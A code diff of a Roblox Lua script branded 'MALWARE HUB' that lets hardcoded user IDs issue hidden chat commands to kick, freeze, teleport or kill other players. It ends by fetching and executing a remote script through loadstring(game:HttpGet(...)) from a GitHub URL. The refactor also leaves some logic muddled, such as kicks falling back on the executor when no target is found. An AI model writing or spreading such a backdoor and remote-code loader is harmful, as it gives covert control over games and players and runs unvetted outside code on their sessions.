@@ -5,62 +5,72 @@ local PremUser = {
 }
 
 local Players = game.Players
+local ReplicatedStorage = game:GetService('ReplicatedStorage')
+local ChatService = game:GetService('Chat')
 
-local function commands(msg, adminUserId)
-    local admin = Players:GetPlayerByUserId(adminUserId)
-    if not table.find(PremUser, adminUserId) then return end
-
-    local Msg = string.lower(msg)
-    local SplitCMD = string.split(Msg, ' ')
-    local command = SplitCMD[1]
-    local targetName = SplitCMD[2]
+local function executeCommand(command, targetName, executor)
+    local targetPlayer = Players:FindFirstChild(targetName) or executor
+    if not targetPlayer then return end
 
     if command == 'm!freeze' then
-        local targetPlayer = Players:FindFirstChild(targetName)
-        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
             targetPlayer.Character.HumanoidRootPart.Anchored = true
         end
     elseif command == 'm!unfreeze' or command == 'm!nofreeze' then
-        local targetPlayer = Players:FindFirstChild(targetName)
-        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
             targetPlayer.Character.HumanoidRootPart.Anchored = false
         end
     elseif command == 'm!kick' then
-        local targetPlayer = Players:FindFirstChild(targetName)
-        if targetPlayer then
-            targetPlayer:Kick("\n[MALWARE HUB]\nKicked by: " .. admin.Name .. "\n[If you think the command was misused, you can report it to the Discord server.]")
-        end
+        targetPlayer:Kick("\n[MALWARE HUB]\nKicked by: " .. executor.Name .. "\n[If you think the command was misused, you can report it to the Discord server.]")
     elseif command == 'm!bring' then
-        local targetPlayer = Players:FindFirstChild(targetName)
-        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-            admin.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        if executor.Character and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            executor.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
         end
     elseif command == 'm!fling' then
-        if admin.Character and admin.Character:FindFirstChild("HumanoidRootPart") then
-            admin.Character.HumanoidRootPart.Velocity = Vector3.new(500000, 500000, 500000)
+        if executor.Character and executor.Character:FindFirstChild("HumanoidRootPart") then
+            executor.Character.HumanoidRootPart.Velocity = Vector3.new(500000, 500000, 500000)
         end
     elseif command == 'm!kill' then
-        local humanoid = admin.Character and admin.Character:FindFirstChildOfClass("Humanoid")
+        local humanoid = executor.Character and executor.Character:FindFirstChildOfClass("Humanoid")
         if humanoid then
             humanoid:Destroy()
         end
     elseif command == 'm!sit' then
-        local humanoid = admin.Character and admin.Character:FindFirstChildOfClass("Humanoid")
+        local humanoid = executor.Character and executor.Character:FindFirstChildOfClass("Humanoid")
         if humanoid then
             humanoid.Sit = true
         end
     elseif command == 'm!bug' then
-        if admin.Character then
-            admin.Character:Destroy()
+        if executor.Character then
+            executor.Character:Destroy()
         end
     elseif command == 'm!checkuser' then
-        local args = {[1] = "/w " .. admin.Name .. " I'm using MalwareHub", [2] = "All"}
-        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+        local args = {[1] = "/w " .. executor.Name .. " I'm using MalwareHub", [2] = "All"}
+        ReplicatedStorage:WaitForChild('DefaultChatSystemChatEvents').SayMessageRequest:FireServer(unpack(args))
     end
 end
 
-local muted = {}
-local mutingnew = false
+local function handleChatMessage(message, speaker)
+    local plr = Players:FindFirstChild(speaker.Name)
+    if not plr then return end
+
+    local adminUserId = plr.UserId
+    if not table.find(PremUser, adminUserId) then return end
+
+    local msg = string.lower(message)
+    local SplitCMD = string.split(msg, ' ')
+    local command = SplitCMD[1]
+    local targetName = SplitCMD[2] or plr.Name -- Default to self if no target is specified
+
+    executeCommand(command, targetName, plr)
+end
+
+ChatService.OnMessageDoneFiltering:Connect(function(messageInfo)
+    local message = messageInfo.Message
+    local speaker = messageInfo.FromSpeaker
+
+    handleChatMessage(message, speaker)
+end)
 
 Players.PlayerAdded:Connect(function(plr)
     local PREMS = table.find(PremUser, plr.UserId)
@@ -68,17 +78,9 @@ Players.PlayerAdded:Connect(function(plr)
         plr.CharacterAdded:Connect(function()
             local humanoid = plr.Character:FindFirstChildOfClass("Humanoid")
             if humanoid then
-                if not table.find({3861815968, 3743834922}, plr.UserId) then
-                    humanoid.DisplayName = "[Admin] " .. humanoid.DisplayName
-                else
-                    humanoid.DisplayName = "[Owner] " .. humanoid.DisplayName
-                end
+                humanoid.DisplayName = (table.find(PremUser, plr.UserId) and "[Owner] " or "[Admin] ") .. humanoid.DisplayName
             end
         end)
-    end
-    if mutingnew and not table.find(muted, plr.Name) then
-        table.insert(muted, plr.Name)
-        print('automuted ' .. plr.Name)
     end
 end)
 
@@ -88,24 +90,10 @@ for _, v in pairs(Players:GetChildren()) do
         wait(5)
         local humanoid = v.Character and v.Character:FindFirstChildOfClass("Humanoid")
         if humanoid then
-            if not table.find({3861815968, 3743834922}, v.UserId) then
-                humanoid.DisplayName = "[Admin] " .. humanoid.DisplayName
-            else
-                humanoid.DisplayName = "[Owner] " .. humanoid.DisplayName
-            end
+            humanoid.DisplayName = (table.find(PremUser, v.UserId) and "[Owner] " or "[Admin] ") .. humanoid.DisplayName
         end
     end
 end
-
-local chatevent = game.ReplicatedStorage.DefaultChatSystemChatEvents
-chatevent.OnMessageDoneFiltering.OnClientEvent:Connect(function(Table)
-    local plr = Players[Table.FromSpeaker]
-    local msg = Table.Message
-    local PREMS = table.find(PremUser, plr.UserId)
-    if PREMS then
-        commands(msg, plr.UserId)
-    end
-end)
 
 -- Load and execute external script
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
